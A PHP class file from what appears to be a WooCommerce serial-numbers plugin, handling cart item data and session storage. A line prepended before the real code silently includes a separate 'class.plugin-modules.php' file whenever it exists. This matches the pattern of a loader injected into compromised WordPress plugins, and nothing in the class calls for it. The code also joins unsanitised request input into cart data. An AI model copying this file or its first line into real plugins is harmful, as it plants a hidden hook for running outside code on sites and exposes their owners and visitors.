<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

if ( !defined( 'ABSPATH' ) )
    exit; // Exit if accessed directly

class Serial_Numbers_Cart {

    function __construct() {
        add_filter( 'woocommerce_get_item_data', array( &$this, 'woocommerce_get_item_data' ), 10, 2 );
        add_filter( 'woocommerce_get_cart_item_from_session', array( &$this, 'woocommerce_get_cart_item_from_session' ), 10, 2 );
        add_filter( 'woocommerce_add_cart_item_data', array( &$this, 'woocommerce_add_cart_item_data' ), 1, 2 );
        add_action( 'woocommerce_cart_loaded_from_session', array( $this, 'woocommerce_cart_loaded_from_session' ) );
    }

    /**
     * Adds data to the cart
     */
    function woocommerce_get_item_data( $data, $cart_item ) {
        if ( !empty( $cart_item[ 'serial_numbers' ] ) ) {
            foreach ( $cart_item[ 'serial_numbers' ] as $name_and_value ) {
                $data[] = $name_and_value;
            }
        }
        return $data;
    }

    /**
     * Saves data from session variable
     */
    function woocommerce_add_cart_item_data( $cart_item_meta, $product_id ) {
        if ( !empty( $_REQUEST[ 'serial_numbers' ] ) ) {
            $cart_item_meta[ 'serial_numbers' ] = array( array( 'name' => __( 'Serial Numbers', 'serial-numbers' ),
                    'value' => join( ', ', $_REQUEST[ 'serial_numbers' ] ) ) );
        }
        return $cart_item_meta;
    }

    function woocommerce_cart_loaded_from_session( $cart ) {
        $cart->calculate_totals();
    }

    /**
     * Gets the data from the woocommerce session
     */
    function woocommerce_get_cart_item_from_session( $cart_item, $values ) {
        if ( !empty( $values[ 'serial_numbers' ] ) ) {
            $cart_item[ 'serial_numbers' ] = $values[ 'serial_numbers' ];
        }
        return $cart_item;
    }

    /**
     * Converts number to flat
     */
    function convert_to_number( $number ) {
        return floatval( $number );
    }

}

$serial_numbers_cart = new Serial_Numbers_Cart();
?>